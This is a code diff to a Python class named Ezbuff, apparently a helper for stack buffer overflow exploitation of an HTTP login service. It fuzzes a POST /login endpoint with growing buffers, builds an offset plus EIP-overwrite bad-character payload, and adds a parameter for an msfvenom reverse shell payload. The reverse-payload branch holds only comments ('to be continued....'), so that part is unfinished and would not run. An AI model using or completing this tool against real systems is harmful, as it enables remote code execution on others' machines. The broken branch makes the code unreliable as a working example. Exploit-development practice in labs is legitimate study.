@@ -214,14 +214,16 @@ class Ezbuff:
 			self.jump_eip = jump_mem_location
 
 
-	def fuzz(self, chars=None):
+	def fuzz(self, chars=None, reverse_payload=None):
 		"""Sends an incrementing number of bytes to an application
 		until it crashes or returns an error and then prints out the
 		number of bytes at the moment of the crash/error. If arg bad_char
 		is passed, function will send bad characters payload.
 
 		Args:
-			chars (str): Will determine if bad characters string will be sent, default=None 
+			chars (str): Will determine if bad characters string will be sent, default=None
+			reverse_payload (bytes): Will store the contents of the msfvenom generated reverse shell
+									payload, default=None
 		"""
 
 		buff = "POST /login HTTP/1.1\r\n"
@@ -237,7 +239,7 @@ class Ezbuff:
 
 		soc = self._create_socket()
 
-		if not chars:
+		if not chars and not reverse_payload:
 			content = "username=" + 'A'*self._num_bytes_crash + "&password=A"
 			buff += f"Content-Length: {str(len(content))}\r\n"
 			buff += "\r\n"
@@ -255,6 +257,9 @@ class Ezbuff:
 						self._num_bytes_crash -= 50
 					finally:
 						self._num_bytes_crash += 50
+		elif reverse_payload:
+			# send reverse payload
+			# to be continued....
 		else:
 			content = "A"*self.offset + "B"*4 + chars + "C"*(self._num_bytes_crash-self.offset-4-len(Ezbuff.chars))
 			buff += f"Content-Length: {str(len(content))}\r\n"
@@ -342,7 +347,4 @@ class Ezbuff:
 		"""
 		with open(payload_file, 'rb') as payload_file:
 			payload = payload_file.read()
-			payload = "A"*self._offset + self.jump_EIP
-			soc = self._create_socket()
-			with soc:
-				pass
+			self.fuzz(reverse_payload=payload)
